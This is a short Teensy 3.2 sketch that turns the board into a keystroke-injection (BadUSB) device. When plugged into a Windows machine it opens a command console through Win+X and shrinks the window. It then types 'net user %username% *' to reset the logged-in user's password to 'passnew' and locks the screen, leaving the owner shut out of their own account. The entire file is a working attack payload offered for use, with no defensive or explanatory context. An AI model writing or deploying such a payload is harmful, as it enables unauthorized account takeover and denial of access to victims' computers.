// Teensy 3.2

// **************************************
//
//  Change active user password and To lock the screen 
//
// **************************************


 void setup()

    {

    delay(5000);

    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);

    Keyboard.set_key1(KEY_X);

    Keyboard.send_now();

    delay(500);

    Keyboard.set_modifier(0);

    Keyboard.set_key1(0);

    Keyboard.send_now();

    delay(4000);
          
    Keyboard.set_key1(KEY_N);

    Keyboard.send_now();

    delay(500);

    Keyboard.set_modifier(0);

    Keyboard.set_key1(0);

    Keyboard.send_now();
    
    delay(3000);
    Keyboard.print("mode con:cols=14 lines=1");

    Keyboard.set_key1(KEY_ENTER);

    Keyboard.send_now();

    Keyboard.set_key1(0);

    Keyboard.send_now();
    
    delay(5000);
    
    Keyboard.print("net user %username% * ");

    Keyboard.set_key1(KEY_ENTER);

    Keyboard.send_now();

    Keyboard.set_key1(0);

    Keyboard.send_now();
    
    delay(4000);
    
    Keyboard.print("passnew");

    Keyboard.set_key1(KEY_ENTER);

    Keyboard.send_now();

    Keyboard.set_key1(0);

    Keyboard.send_now();
    
    delay(3000);
    
    Keyboard.print("passnew");

    Keyboard.set_key1(KEY_ENTER);

    Keyboard.send_now();

    Keyboard.set_key1(0);

    Keyboard.send_now();
    
    delay(4000);
    
    Keyboard.set_modifier(MODIFIERKEY_ALT);

    Keyboard.set_key1(KEY_SPACE);

    Keyboard.send_now();

    delay(500);

    Keyboard.set_modifier(0);

    Keyboard.set_key1(0);

    Keyboard.send_now();
    
    delay(5000);
    
    Keyboard.set_key1(KEY_K);

    Keyboard.send_now();

    delay(500);

    Keyboard.set_modifier(0);

    Keyboard.set_key1(0);
    
    delay(5000);

    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);

    Keyboard.set_key1(KEY_L);

    Keyboard.send_now();

    delay(500);

    Keyboard.set_modifier(0);

    Keyboard.set_key1(0);

    Keyboard.send_now();

    }

    void loop()

    {

    }
